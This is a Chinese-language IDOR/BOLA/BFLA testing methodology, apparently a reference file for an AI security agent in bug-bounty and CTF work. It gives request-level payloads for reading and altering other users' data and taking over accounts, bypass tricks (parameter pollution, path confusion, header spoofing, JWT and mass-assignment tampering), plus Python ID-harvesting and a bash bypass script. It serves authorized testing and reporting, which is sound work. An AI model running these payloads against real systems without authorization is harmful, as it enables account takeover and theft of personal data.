# IDOR 不安全直接对象引用方法论

> **SRC / 众测语境** → 用 `read_reference(path: "src-hunter/playbooks/arbitrary-x-authz.md")`（任意账号 86.4% / 任意操作 72.5% 统计 + 465 份 H1 案例）

> 融合来源：wgpsec/AboutSecurity（方法论主体 + 高级模式深度）+ yaklang/hack-skills（BOLA/BFLA 实战手册，见文末附录）。重复段已去重。
> 本文件自包含：绕过技巧（参数包装/编码/HPP/方法切换，原 idor-bypass-techniques.md）、高级模式（多步链/文件IDOR/批量操作/间接引用/框架特征/证据规范，原 idor-advanced-patterns.md）、批量检测脚本与标识符可预测性（原 idor-techniques.md）全部内联。
>
> IDOR 是最常见的 API 漏洞之一——开发者检查了"你是否登录"但没检查"你是否有权访问这条数据"。改一个数字就能拿到别人的数据，改一个 role 就能变成管理员。

---

## Phase 1: 发现 IDOR 入口

任何带有对象标识符的位置都是 IDOR 候选：

| 位置 | 示例 | 优先级 |
|------|------|--------|
| URL 路径 | `/api/users/1001` | 🔴 高 |
| Query 参数 | `?user_id=1001&order_id=5003` | 🔴 高 |
| POST/PUT Body | `{"user_id": 1001}` | 🔴 高 |
| Cookie/Header | `uid=1001` / `X-User-Id: 1001` | 🟡 中 |
| 文件路径 | `/uploads/user_1001/avatar.jpg` | 🟡 中 |
| GraphQL 变量 | `query { user(id: 1001) {...} }` | 🔴 高 |
| WebSocket 消息 | `{"action":"getProfile","uid":1001}` | 🟡 中 |

**关键识别信号**：自增整数、短序列号（ORD-001）、Base64 编码的 ID、URL 中的文件名/路径。

## Phase 2: 水平越权测试（读操作）

需要至少两个账户（注册两个，或已知自己的 ID）。

```
账户 A (uid=1001) 的 Token:
GET /api/users/1001/profile → 200（自己的数据，记录作为基线）
GET /api/users/1002/profile → 200 + 不同数据？→ IDOR！
GET /api/users/1/profile    → 管理员数据？→ 垂直越权！
GET /api/users/0/profile    → 500 错误泄露内部信息？
```

**响应对比分析**（不能只看状态码）：
| 响应 | 判断 | 下一步 |
|------|------|--------|
| 200 + 不同用户数据 | ✅ IDOR 确认 | 保存证据，测写操作 |
| 200 + 相同数据 | 后端忽略了 ID 参数 | 换其他端点 |
| 200 + 空数据 | 用户不存在或数据为空 | 换 ID 范围 |
| 403/401 | 有权限检查 | 尝试绕过 → Phase 5 |
| 404 | ID 不存在 | 换 ID 范围或枚举 |
| 500 | 后端报错 | 分析错误信息 |

→ 批量检测脚本 → 下文对应 REF 章节

## Phase 3: 写操作越权

确认读越权后，写操作的危害大 10 倍——能改密码就能接管账户：

```
PUT    /api/users/1002         {"email":"evil@x.com"}    → 接管账户
PATCH  /api/users/1002         {"password":"hacked"}     → 改密码
DELETE /api/orders/5003                                   → 删除他人订单
POST   /api/users/1/reset-pwd                             → 重置管理员密码
PUT    /api/users/1002/role    {"role":"admin"}           → 提权
```

**重要**：很多应用 GET 有权限检查但 POST/PUT/DELETE 忘了——所有 HTTP 方法都要测。

## Phase 4: 垂直越权

用普通用户身份访问管理功能：

```
GET  /api/admin/users          → 管理员用户列表？
POST /api/admin/create-user    → 能创建用户？
GET  /api/admin/config         → 系统配置泄露？
GET  /api/internal/dashboard   → 内部面板？
```

### 审批/Workflow 系统越权

OA、合同审批、工单系统中，"审批"操作是最典型的垂直越权目标——用员工身份调用管理员的审批接口：

```
# 例如
POST   /contracts/1/approve
PATCH  /contracts/1  {"status":"approved"}
POST   /api/admin/approval  {"id":1,"action":"approve"}
```

**关键**：审批端点经常不是独立文件，而是内嵌在 dashboard 的 `$_POST['action']` 处理中。如果有 LFI/源码，直接从源码里搜 `approve`/`审批`/`action` 找到准确端点，不要盲猜路径。

**JWT Claims 篡改**：解码 JWT → 改 `"role":"user"` 为 `"role":"admin"` → 如果 `alg:none` 或弱密钥可伪造

**Mass Assignment**：注册/更新时注入 `{"role":"admin","is_admin":true}`

## Phase 5: IDOR 绕过技巧

当基础测试返回 403 时，不要放弃——很多权限检查可以绕过：

| 绕过手法 | 示例 |
|----------|------|
| ID 参数包装 | `id=1002` → `id[]=1002`、`id={"$eq":1002}` |
| HTTP 方法切换 | GET 403 → PUT/PATCH/DELETE 200？ |
| 路径变体 | `/api/v1/` → `/api/v2/`、`/api/internal/` |
| 编码绕过 | Base64、Hex、双重 URL 编码 |
| 参数污染 HPP | `?id=mine&id=victim`（后端可能取最后一个） |
| Content-Type 切换 | JSON→XML→form-urlencoded（不同解析器不同过滤） |
| 请求走私/分块 | 绕过前端代理的权限检查 |

→ 完整绕过 payload 和脚本 → 下文对应 REF 章节

## Phase 6: 多步 IDOR 链

很多 IDOR 不是单步的——需要从 A 接口获取信息，然后在 B 接口利用：

```
1. GET /api/comments → 评论中泄露 user_id: 1002
2. GET /api/users/1002/profile → 用泄露的 ID 读取个人资料
3. GET /api/users/1002/orders → 进一步读取订单数据

1. GET /api/invites?code=ABC → 响应含 group_id: 77
2. GET /api/groups/77/members → 用泄露的 group_id 获取成员列表
```

**ID 泄露狩猎清单**：评论、消息、日志、邀请链接、分享链接、导出文件、API 错误响应、GraphQL Introspection、JS 前端代码。

→ 详细猎杀流程 → 下文对应 REF 章节

## Phase 7: 文件/媒体资源 IDOR

上传的文件往往比 API 数据更缺乏权限检查：

```
/uploads/user_1001/avatar.jpg   → 改 1001 为 1002
/attachments/report-001.pdf     → 遍历编号
/export/data-20260101.csv       → 改日期遍历
/media/a1b2c3d4.jpg             → 可预测哈希？
```

**S3/OSS 直链**：如果文件 URL 是 `https://bucket.s3.amazonaws.com/users/1001/doc.pdf`，直接改路径可能绕过应用层权限。

## Phase 8: 批量操作与间接引用

### 批量操作 IDOR
```json
// 批量端点可能完全跳过单条权限检查
POST /api/users/bulk {"ids": [1001, 1002, 1003, 1004]}
POST /api/orders/export {"order_ids": [5001, 5002, 5003]}

// GraphQL batch
[
  {"query": "{ user(id:1) { email } }"},
  {"query": "{ user(id:2) { email } }"}
]
```

### 间接引用 IDOR
不用数字 ID，用 email/phone/username：
```
GET /api/users?email=victim@test.com     → 用邮箱查别人
POST /api/password-reset {"phone":"13800138001"}  → 用手机号重置
GET /api/profile/john_doe                → 用户名即标识符
```

→ 详细模式 → 下文对应 REF 章节

## Phase 9: 框架特征 IDOR

不同后端框架有不同的 IDOR 高发模式：

| 框架 | 高发点 | 原因 |
|------|--------|------|
| Spring Data REST | `/{entity}/{id}` 全暴露 | 自动生成 CRUD 端点，默认无权限 |
| Django REST Framework | `/api/{model}/{pk}/` | ViewSet 默认开放，忘加 permission_classes |
| Express + Mongoose | `/api/users/:id` | 中间件顺序错误导致鉴权被跳过 |
| Laravel | `/api/{model}/{id}` | Route Model Binding 自动查询，忘加 Policy |
| GraphQL (任何) | `query { node(id:"...") }` | Relay Global ID 可能暴露任意对象 |

## 证据收集规范

有效的 IDOR PoC 必须证明**看到了别人的数据**，不是自己的：

1. **请求/响应对**：完整的 HTTP 请求（含认证头）+ 完整响应
2. **两账号对比**：A 账号访问 B 的数据，B 账号访问同一端点确认数据属于 B
3. **关键字段标注**：高亮返回数据中的敏感字段（姓名、邮箱、手机号）
4. **证明 ID 差异**：明确标注请求中的 ID 与当前登录用户 ID 不同

```
✅ 好的证据:
"用 A 账号(uid=1001) 的 token 请求 /api/users/1002/profile，
返回了 B 账号的姓名(张三)、邮箱(zhangsan@test.com)、手机号"

❌ 差的证据:
"请求 /api/users/1002 返回了 200"
（没有证明返回的是别人的数据）
```

**每确认一个 IDOR 立即 `evidence_save` + `report_vuln`**，包含：请求 URL、请求头、响应状态码、响应中的敏感数据摘要。

## CTF 专项: Flag 获取
访问 `/api/flag`, `/admin/flag` | 查管理员 profile/notes | 检查 ID=1 用户或者高权限用户 | `/api/users/0` 或 `/api/users/-1`


---

## REF: idor-advanced-patterns

# IDOR 高级模式

## 1. 多步 IDOR 链

很多 IDOR 需要先从一个接口获取 ID，再在另一个接口利用。系统化的 ID 泄露狩猎：

### ID 泄露源清单

| 泄露源 | 说明 | 猎取方式 |
|--------|------|----------|
| 评论/留言 | 评论者 user_id 常公开 | `GET /api/comments` 查看 author_id |
| 消息/通知 | 发送者/接收者 ID | `GET /api/messages` |
| 邀请链接 | 含 group_id/org_id | 分析邀请 URL 参数 |
| 分享链接 | 含 doc_id/file_id | 分析分享 URL 路径 |
| 公开列表 | 排行榜、成员列表 | `GET /api/leaderboard` |
| API 错误响应 | 报错信息含内部 ID | 故意发畸形请求 |
| GraphQL Introspection | 暴露所有对象类型和关系 | `query { __schema {...} }` |
| JS 前端代码 | 硬编码的 ID/路径 | 分析 JS bundle → `/skill:js-api-extract` |
| 导出文件 | CSV/Excel 含内部 ID | 下载报表分析列 |
| Webhook/回调 | 包含完整对象数据 | 注册 webhook 接收数据 |

### 典型攻击链

```
链路 1: 评论泄露 → 个人资料 → 订单数据
  GET /api/posts/1/comments → {"author_id": 1002, "text": "..."}
  GET /api/users/1002/profile → {"name":"张三", "email":"..."}
  GET /api/users/1002/orders → [{"id":5001, "amount":999}]

链路 2: 搜索泄露 → 管理操作
  GET /api/users/search?q=admin → {"results":[{"id":1,"username":"admin"}]}
  PUT /api/users/1/password → {"password":"hacked"}

链路 3: GraphQL 泄露 → 任意对象
  POST /graphql {"query":"{ __type(name:\"User\") { fields { name } } }"}
  → 发现 secretNote 字段
  POST /graphql {"query":"{ user(id:1) { secretNote } }"}

链路 4: 文件名猜测 → 敏感文件
  GET /api/users/me/avatar → URL: /uploads/user_1001_avatar.jpg
  GET /uploads/user_1_avatar.jpg → 管理员头像（确认路径规律）
  GET /uploads/user_1002_resume.pdf → 他人简历
```

### ID 收集自动化

```python
import requests, re, json

def harvest_ids(base_url, token):
    """从多个端点收集所有可见的用户 ID"""
    headers = {"Authorization": f"Bearer {token}"}
    ids = set()
    
    # 从评论中收集
    r = requests.get(f"{base_url}/api/comments?limit=100", headers=headers)
    if r.ok:
        for c in r.json().get("data", []):
            for key in ["author_id", "user_id", "uid", "created_by"]:
                if key in c:
                    ids.add(c[key])
    
    # 从搜索中收集
    for q in ["a", "e", "i", "admin", "test"]:
        r = requests.get(f"{base_url}/api/users/search?q={q}", headers=headers)
        if r.ok:
            for u in r.json().get("results", []):
                if "id" in u:
                    ids.add(u["id"])
    
    # 从公开列表收集
    for endpoint in ["/api/leaderboard", "/api/members", "/api/users"]:
        r = requests.get(f"{base_url}{endpoint}?limit=100", headers=headers)
        if r.ok:
            data = r.json()
            if isinstance(data, list):
                items = data
            else:
                items = data.get("data", data.get("results", []))
            for item in items:
                if isinstance(item, dict) and "id" in item:
                    ids.add(item["id"])
    
    return sorted(ids)
```

---

## 2. 文件/媒体资源 IDOR

文件 IDOR 的特殊性：应用层有权限检查，但文件存储层（S3/OSS/本地）往往直接暴露。

### 可预测文件名模式

| 模式 | 示例 | 遍历方式 |
|------|------|----------|
| 自增编号 | `report-001.pdf` | 遍历 001-999 |
| 用户ID+类型 | `user_1001_avatar.jpg` | 改用户 ID |
| 时间戳 | `backup-20260101.sql` | 遍历日期 |
| UUID v1 | `6ba7b810-9dad-...` | v1 含时间戳，可推算范围 |
| 短哈希 | `a1b2c3.jpg` | 如果只有 6 位十六进制 → 可爆破 |

### 云存储直链测试

```bash
# S3 存储桶
GET https://bucket.s3.amazonaws.com/users/1001/document.pdf → 自己的
GET https://bucket.s3.amazonaws.com/users/1002/document.pdf → 别人的？

# 阿里云 OSS
GET https://bucket.oss-cn-hangzhou.aliyuncs.com/uploads/1001/file.docx
GET https://bucket.oss-cn-hangzhou.aliyuncs.com/uploads/1002/file.docx

# 签名 URL 分析
# 如果 URL 含 ?Signature=xxx&Expires=xxx，检查：
# 1. 去掉签名参数能否直接访问
# 2. 修改路径但保留签名能否访问其他文件
# 3. 签名过期时间是否过长（永不过期的签名=永久访问）
```

### 上传路径 IDOR

```bash
# 上传时指定目标路径
POST /api/upload -F "file=@shell.jpg" -F "path=/users/1002/"
# 如果可以控制上传路径 → 覆盖他人文件

# 上传回调泄露路径
POST /api/upload → {"url":"/tmp/uploads/abc123/file.pdf"}
# 分析路径规律，尝试遍历其他用户的上传目录
```

---

## 3. 批量操作 IDOR

批量端点是权限检查的重灾区——开发者通常对单条做了鉴权，但批量接口完全跳过。

### 常见批量端点

```bash
# REST 批量
POST /api/users/bulk      {"ids": [1, 2, 3, 1002]}
POST /api/orders/export   {"order_ids": [5001, 5002]}
DELETE /api/messages/batch {"message_ids": [101, 102, 103]}
PATCH /api/items/bulk-update [{"id":1,"status":"sold"},{"id":2,"status":"sold"}]

# GraphQL 批量查询
POST /graphql
[
  {"query": "{ user(id:\"1\") { name email phone } }"},
  {"query": "{ user(id:\"2\") { name email phone } }"},
  {"query": "{ user(id:\"3\") { name email phone } }"}
]

# GraphQL aliases（单请求多 ID）
POST /graphql
{"query": "{ u1:user(id:\"1\"){email} u2:user(id:\"2\"){email} u3:user(id:\"3\"){email} }"}

# 数组型参数（URL）
GET /api/users?id=1&id=2&id=3&id=1002
GET /api/users?ids[]=1&ids[]=2&ids[]=1002
```

### 批量操作检测脚本

```python
import requests

def test_bulk_idor(base_url, token, my_id, victim_ids):
    """测试批量端点是否有 IDOR"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # 混入自己的 ID（合法）和他人的 ID（越权）
    all_ids = [my_id] + victim_ids
    
    bulk_endpoints = [
        ("POST", "/api/users/bulk", {"ids": all_ids}),
        ("POST", "/api/data/export", {"user_ids": all_ids}),
        ("GET", f"/api/users?ids={','.join(map(str, all_ids))}", None),
    ]
    
    for method, path, body in bulk_endpoints:
        try:
            if method == "GET":
                r = requests.get(f"{base_url}{path}", headers=headers, timeout=10)
            else:
                r = requests.request(method, f"{base_url}{path}",
                                   headers=headers, json=body, timeout=10)
            print(f"{method} {path} → {r.status_code} ({len(r.content)} bytes)")
            if r.ok and len(r.content) > 100:
                print(f"  ⚠️ 返回数据较多，可能包含他人数据")
        except Exception as e:
            print(f"{method} {path} → ERROR: {e}")
```

---

## 4. 间接引用 IDOR

不用数字 ID，用其他标识符（email、phone、username）也能越权：

### 间接标识符列表

| 标识符 | 示例 | 可枚举性 |
|--------|------|----------|
| 邮箱 | `victim@test.com` | 社工/泄露库 |
| 手机号 | `13800138001` | 遍历号段 |
| 用户名 | `john_doe` | 公开列表/搜索 |
| 工号/学号 | `EMP-2024-001` | 有规律，可猜测 |
| 订单号 | `ORD-20260101-001` | 时间+序号 |
| 身份证号 | `110101200001011234` | 社工 |

### 枚举手法

```bash
# 邮箱枚举（通过注册/密码重置的不同响应推断）
POST /api/register {"email":"test@test.com"} → "邮箱已存在" = 有效
POST /api/register {"email":"xxx@test.com"}  → "注册成功" = 无效

# 手机号枚举
POST /api/check-phone {"phone":"13800138001"} → {"exists": true}
POST /api/check-phone {"phone":"13800138002"} → {"exists": false}

# 用户名 → 个人资料
GET /api/profile/john_doe → 返回他人完整资料
GET /api/profile/admin    → 管理员资料

# 密码重置越权
POST /api/reset-password {"email":"victim@test.com"}
# 如果重置链接/验证码发到攻击者可见的地方 → 接管账户
```

---

## 5. 框架特征 IDOR

### Spring Data REST
```bash
# 自动暴露所有 JPA entity 的 CRUD 端点
GET /api/users           → 所有用户列表（默认无权限）
GET /api/users/1         → 特定用户
GET /api/users/1/orders  → 用户的关联订单
GET /api/profile         → HAL Explorer 暴露所有端点

# Spring Actuator 辅助
GET /actuator/mappings   → 暴露所有 URL 映射
GET /actuator/beans      → 暴露所有 Bean（含 Repository 名）
```

### Django REST Framework
```bash
# ViewSet 默认开放，忘加 permission_classes
GET /api/users/?format=json  → 用户列表
GET /api/users/1/?format=api → 带 HTML 的 API 浏览器（信息泄露）

# 过滤器参数
GET /api/users/?role=admin   → 过滤管理员
GET /api/users/?email=admin@test.com → 按邮箱查
```

### Laravel
```bash
# Route Model Binding 自动根据 {id} 查询
GET /api/users/1    → User::find(1) 无权限检查
GET /api/orders/1   → Order::find(1)

# 软删除数据
GET /api/users/1?withTrashed=true → 可能返回已删除的用户
```

### GraphQL
```bash
# Relay Global ID（Base64 编码的 type:id）
echo "VXNlcjox" | base64 -d  → "User:1"
echo "VXNlcjoy" | base64 -d  → "User:2"

# node() 接口通常缺少权限检查
POST /graphql {"query":"{ node(id:\"VXNlcjox\") { ... on User { email phone } } }"}

# Introspection 暴露所有可查询字段
POST /graphql {"query":"{ __schema { types { name fields { name } } } }"}
# 发现隐藏字段如 secretAnswer, ssn, creditCard
```

### Express + Mongoose
```bash
# 中间件顺序问题：认证中间件在路由之后
# 或 .populate() 泄露关联数据
GET /api/users/1?populate=orders,payments,addresses
# 通过 populate 参数拉出所有关联数据
```

---

## 6. 证据收集规范

### 最小有效 PoC 模板

```markdown
## IDOR - [水平/垂直]越权 - [端点路径]

**漏洞类型**: IDOR (Insecure Direct Object Reference)
**严重性**: [HIGH/CRITICAL]
**影响**: [能读取他人数据 / 能修改他人数据 / 能接管他人账户]

### 复现步骤

1. 注册两个账户：A (uid=1001) 和 B (uid=1002)
2. 用 A 的 token 请求 B 的数据

### 请求

```
GET /api/users/1002/profile HTTP/1.1
Host: target.com
Authorization: Bearer <A_TOKEN>
```

### 响应

```
HTTP/1.1 200 OK
{"id":1002, "name":"B用户", "email":"b@test.com", "phone":"138xxxx"}
```

### 证明

- 请求中使用 A 的 token (uid=1001)
- 请求的路径是 B 的 ID (1002)
- 响应返回了 B 的个人数据（姓名、邮箱、手机号）
- 确认非自己数据：A 的邮箱是 a@test.com，响应中是 b@test.com
```

### 证据质量检查清单

- [ ] 请求中包含完整的认证头（证明是谁在请求）
- [ ] 请求中的 ID/标识符 ≠ 当前登录用户
- [ ] 响应中的数据明确属于另一个用户（有具体的数据差异）
- [ ] 如果只有状态码差异，额外证明数据确实不同（Content-Length、Body）
- [ ] 写操作 IDOR 需要验证修改确实生效（再次查询确认）


---

## REF: idor-bypass-techniques

# IDOR 绕过技巧详解

当基础 IDOR 测试返回 403/401 时，以下技巧可能绕过权限检查。核心原理是：前端代理和后端应用可能对同一请求有不同的理解。

---

## 1. ID 参数包装与类型混淆

后端可能只检查了 `id=int` 的情况，换个类型就绕过了：

```bash
# 原始请求（被拦截）
GET /api/users/1002

# 数组包装
GET /api/users?id[]=1002
POST -d '{"id":[1002]}'

# JSON 对象包装（NoSQL 风格）
POST -d '{"id":{"$eq":1002}}'
POST -d '{"id":{"$in":[1001,1002,1003]}}'

# 字符串化
GET /api/users/"1002"
POST -d '{"id":"1002"}'   # 原本是 int，换 string

# 浮点数
GET /api/users/1002.0

# 科学计数法
GET /api/users/1.002e3

# 负数索引（某些框架从末尾算）
GET /api/users/-1         # 最后一个用户（可能是管理员）
```

## 2. HTTP 方法切换

权限检查可能只加在了某些方法上：

```bash
# GET 有检查
GET /api/users/1002 → 403

# 但其他方法忘了
PUT /api/users/1002 → 200?
PATCH /api/users/1002 → 200?
DELETE /api/users/1002 → 200?
OPTIONS /api/users/1002 → 暴露 Allow 头
HEAD /api/users/1002 → 状态码泄露

# POST + _method 覆盖（Rails/Laravel）
POST /api/users/1002  -d '_method=PUT'
POST /api/users/1002  -H 'X-HTTP-Method-Override: PUT'
POST /api/users/1002  -H 'X-Method-Override: DELETE'
```

## 3. 路径变体绕过

前端代理和后端应用对路径的解析可能不一致：

```bash
# 原始（被拦截）
GET /api/users/1002

# API 版本降级（旧版可能没权限检查）
GET /api/v1/users/1002    # v2 有检查，v1 没有
GET /api/v0/users/1002

# 内部路径
GET /api/internal/users/1002
GET /internal-api/users/1002
GET /api/debug/users/1002

# 路径混淆
GET /api/users/1002/.     # trailing dot
GET /api/users/1002/      # trailing slash
GET /api//users//1002     # double slash
GET /api/users/./1002     # dot segment
GET /api/users/1002%00    # null byte
GET /api/users/1002;.js   # Tomcat/Nginx 解析差异
GET /api/users/1002..;/   # Spring 路径遍历

# 大小写变体
GET /API/Users/1002
GET /Api/USERS/1002
```

## 4. 编码绕过

```bash
# URL 编码
GET /api/users/%31%30%30%32          # 1002 的 URL 编码

# 双重 URL 编码
GET /api/users/%25%33%31%25%33%30%25%33%30%25%33%32

# Base64 编码（如果 ID 是 Base64）
# 原始 id=eyJ1c2VyX2lkIjoxMDAxfQ==  → 解码: {"user_id":1001}
# 篡改为 {"user_id":1002} → 重新 Base64 编码

# Unicode 编码
GET /api/users/１００２   # 全角数字

# Hex 编码
GET /api/users/0x3EA      # 1002 的十六进制

# 汉字编码 ID（SRC 实战案例）
# 有些系统用汉字的 Unicode 编码点作为 ID
# 例如 ID=4863 → 对应汉字"且丘世专" → URL 编码为 %E4%B8%94%E4%B8%98%E4%B8%96%E4%B8%93
GET /api/user?id=%E4%B8%94%E4%B8%98%E4%B8%96%E4%B8%93
# 遇到非数字 ID 时，先 URL 解码看是否为可读文本，再分析编码规律
```

## 4.5 参数拼接越权

当接口的正常参数无法直接越权时，尝试用 `&` 拼接额外的身份标识参数：

```bash
# 原始接口（只返回自己的信息，没有可修改的 ID 参数）
GET /gateway/api?Action=GetUser&Version=2020-06-01

# 拼接身份参数（从其他接口/功能中获取到的他人 ID）
GET /gateway/api?Action=GetUser&Version=2020-06-01&UserId=victim_id

# 常见可拼接参数名：userId, uid, user_id, account_id, memberId, owner
```

原理：接口原本从 session 取用户 ID，但如果请求中显式传了 UserId，后端可能优先使用请求参数。同一功能如果有多个等价接口（返回相同数据），每个都值得尝试拼接。

## 5. 参数污染 (HPP - HTTP Parameter Pollution)

不同后端对重复参数的处理不同：

```bash
# 同名参数重复
GET /api/users?id=1001&id=1002
# PHP/Apache → 取最后一个 (1002)
# ASP.NET   → 拼接 "1001,1002"
# Express   → 取第一个 (1001)
# Flask     → 取第一个 (1001)

# 如果前端检查第一个，后端用最后一个 → 绕过
GET /api/users?id=1001&id=1002
#              ↑前端检查这个  ↑后端用这个
```

```bash
# JSON 参数污染（重复 key）
POST -d '{"id":1001, "id":1002}'
# 不同 JSON 解析器对重复 key 的处理不同

# 嵌套参数覆盖
POST -d '{"user":{"id":1001},"user":{"id":1002}}'
```

## 6. Content-Type 切换

```bash
# JSON 请求被过滤
POST /api/users/update -H "Content-Type: application/json"
-d '{"id":1002,"name":"hacked"}'  → 403

# 换 XML（可能走不同的过滤器）
POST /api/users/update -H "Content-Type: application/xml"
-d '<user><id>1002</id><name>hacked</name></user>'  → 200?

# 换 form-urlencoded
POST /api/users/update -H "Content-Type: application/x-www-form-urlencoded"
-d 'id=1002&name=hacked'  → 200?

# 换 multipart
POST /api/users/update -H "Content-Type: multipart/form-data; boundary=---"
...boundary + id=1002  → 200?
```

## 7. Header 注入绕过

```bash
# IP 白名单绕过（如果后端信任这些头）
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# 路径覆盖（Nginx/Apache 反向代理）
X-Original-URL: /api/admin/users/1002
X-Rewrite-URL: /api/admin/users/1002

# 自定义用户标识覆盖
X-User-Id: 1002
X-Account-Id: 1002
X-Custom-Auth: admin
```

## 8. 自动化绕过测试脚本

```bash
#!/bin/bash
# 用法: bash idor_bypass.sh https://target.com/api/users TOKEN VICTIM_ID
BASE="$1"
TOKEN="$2"
VID="$3"
AUTH="Authorization: Bearer $TOKEN"

echo "=== Method Bypass ==="
for m in GET POST PUT PATCH DELETE HEAD OPTIONS; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $m "$BASE/$VID" -H "$AUTH")
    echo "$m → $code"
done

echo "=== Path Variants ==="
for path in "$BASE/$VID/" "$BASE/$VID/." "$BASE//$VID" "$BASE/$VID%00" "$BASE/$VID;.js"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$path" -H "$AUTH")
    echo "$path → $code"
done

echo "=== Version Downgrade ==="
for ver in v1 v0 internal debug; do
    url=$(echo "$BASE" | sed "s|/v[0-9]*/|/$ver/|")
    code=$(curl -s -o /dev/null -w "%{http_code}" "$url/$VID" -H "$AUTH")
    echo "$ver → $code"
done

echo "=== Parameter Pollution ==="
code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE?id=self&id=$VID" -H "$AUTH")
echo "HPP → $code"

echo "=== Type Confusion ==="
for payload in '{"id":['$VID']}' '{"id":"'$VID'"}' '{"id":{"$eq":'$VID'}}'; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE" -H "$AUTH" -H "Content-Type: application/json" -d "$payload")
    echo "$payload → $code"
done
```

## 绕过思路决策树

```
403/401？
├─ 换 HTTP 方法 (PUT/PATCH/DELETE)
│  └─ 200? → 方法级 IDOR
├─ 换路径变体 (/., //, ;.js, %00)
│  └─ 200? → 路径解析差异绕过
├─ 换 API 版本 (v1/v0/internal)
│  └─ 200? → 旧版本未修复
├─ 参数包装 (数组/JSON对象/字符串)
│  └─ 200? → 类型检查不严
├─ 参数污染 (HPP)
│  └─ 200? → 前后端参数取值不一致
├─ Content-Type 切换
│  └─ 200? → 不同解析器不同过滤
├─ Header 注入 (X-Forwarded-For, X-Original-URL)
│  └─ 200? → 代理信任内部头
└─ 都失败 → 权限检查可能确实到位，换其他端点
```


---

## REF: idor-techniques

# IDOR 深度利用技术

## 批量检测脚本

如果 ID 是自增的，用脚本批量检测：
```python
import requests

for uid in range(1, 100):
    r = requests.get(f'http://target/api/users/{uid}/profile',
                     headers={'Authorization': 'Bearer YOUR_TOKEN'})
    if r.status_code == 200 and uid != 1001:  # 1001 是你自己
        print(f'IDOR: user {uid} accessible')
```

## 写操作越权测试

确认读越权后，测试更危险的写操作：
```
PUT /api/users/1002 {"email": "attacker@evil.com"}    → 修改他人邮箱
PATCH /api/users/1002 {"password": "hacked"}           → 修改他人密码
DELETE /api/orders/5003                                 → 删除他人订单
POST /api/users/1/reset-password                        → 重置管理员密码
```

写操作 IDOR 比读操作严重得多——能改密码就能接管账户。

## 垂直越权

### 访问管理端点
```
GET /api/admin/users          → 普通用户能访问管理接口？
GET /api/admin/dashboard      → 管理面板数据？
POST /api/admin/create-user   → 能创建新用户？
```

### JWT/Token Claims 篡改
```json
// 解码 JWT payload
{"user_id": 1001, "role": "user"}
// 篡改
{"user_id": 1, "role": "admin"}
```
如果 JWT 可以被篡改（`alg:none` 或弱密钥），这就是垂直越权。
详细 JWT 攻击参考 `jwt-attack-methodology`。

### 参数注入提权
注册/更新个人资料时注入权限字段：
```json
{"username": "test", "role": "admin"}
{"username": "test", "is_admin": true}
```
详细 Mass Assignment 参考 `privilege-escalation-web`。

## 标识符类型与可预测性

| 类型 | 示例 | 可预测性 |
|------|------|----------|
| 自增整数 | `1, 2, 3, 4...` | 极高——直接遍历 |
| 短序列号 | `ORD-001, ORD-002` | 高——有规律 |
| 时间戳 | `1679012345` | 中——可推算范围 |
| UUID v1 | `6ba7b810-9dad-...` | 中——v1 含时间戳，可推测 |
| UUID v4 | `f47ac10b-58cc-...` | 低——真随机 |
| 哈希值 | `a1b2c3d4e5f6...` | 低——需要其他泄露 |

UUID v4 通常安全但也要测试——有时 API 会在其他接口泄露 UUID。



---

# 深入：IDOR / BOLA / BFLA 实战手册

> 融合自 yaklang/hack-skills `idor-broken-object-authorization`，与上文去重后仅保留独有内容。水平/垂直越权基础操作见上文 Phase 2-4；多步链/文件IDOR/批量操作见上文 REF: idor-advanced-patterns。

## IDOR vs BOLA vs BFLA

| 术语 | 含义 | 影响 |
|---|---|---|
| IDOR | 不安全的直接对象引用 | 读/改他人数据 |
| BOLA | 对象级授权失效（OWASP API Top 10 A1） | 同 IDOR，API 语境 |
| BFLA | 函数级授权失效 | 低权限用户调用高权限**功能**（管理端点） |

区分：BOLA = 访问不属于你的**对象**；BFLA = 调用不该有权调用的**功能**（admin CRUD、批量操作、用户管理）。

## 对象 ID 的全部藏身处（别只盯 URL）

```text
URL path:     GET /api/v1/users/1234/profile
URL query:    GET /orders?order_id=982
请求体:       {"userId": 1234, "action": "view"}
JSON 嵌套:    {"resource": {"id": 5678, "type": "invoice"}}
请求头:       X-User-ID: 1234 / X-Account-ID: 9999
Cookie:       user_id=1234; account=org_5678
GraphQL:      query { user(id: "1234") { ... } }
表单字段:     <input name="documentId" value="5678">
WebSocket:    {"event":"subscribe","channel_id":9999}
```

## A-B 测试法（最系统化）

```text
1. 注册两个测试账号 UserA / UserB
2. 以 UserA 执行全部操作并抓包（改资料/看订单/改密码/取文件…）
3. 记录 UserA 创建或访问的每个对象 ID
4. 换 UserB 登录
5. 用 UserB 的会话重放 UserA 的请求
6. UserB 能读/改 UserA 的数据 = BOLA 实锤
```

报漏洞时用真实用户数据更有说服力；证据要同时证明「A 拥有该资源」和「B 访问到了它」。

## ID 类型与可预测性

| ID 模式 | 示例 | 说明 |
|---|---|---|
| 顺序整数 | `id=1001` → `id=1002` | 易预测，命中率高 |
| UUID v4 | `550e8400-...` | 需从其他端点收集 |
| UUID v1 | 时间基 | **可预测**！从时间戳/MAC 推算 |
| 自有数据里的 GUID | 响应中可见 | 先收集自己账号的全部 UUID |
| 哈希 ID | `md5(user_id)` | 试哈希顺序整数 |
| 编码 ID | base64(`{"id":1001}`) | 解码 → 改 → 再编码 |
| 复合 ID | `/api/users/1/orders/5` | 两个 ID 可独立验证 |

## HTTP 方法升级

`GET /resource/1234` 有防护时，把所有动词都试一遍 —— 授权逻辑常按方法分别实现，边缘方法最容易被忘掉：

```http
PUT /api/v1/users/UserA_ID     ← 改他人数据
PATCH /api/v1/users/UserA_ID   ← 部分更新（授权检查最常漏）
DELETE /api/v1/users/UserA_ID  ← 删他人账号
```

## 参数污染与类型混淆

```
id[]=1234&id[]=5678           ← 数组：应用可能取第一个或最后一个
id=5678&id=1234               ← 重复参数
{"id": "1234"} vs {"id": 1234} ← 字符串 vs 整数可能走不同代码路径
{"id": [1234]}                 ← JSON 数组
{"userId": 1234, "id": 5678}   ← 两个 ID 字段：授权用哪个？
```

## BFLA 攻击面

常测端点：

```http
GET    /api/v1/admin/users
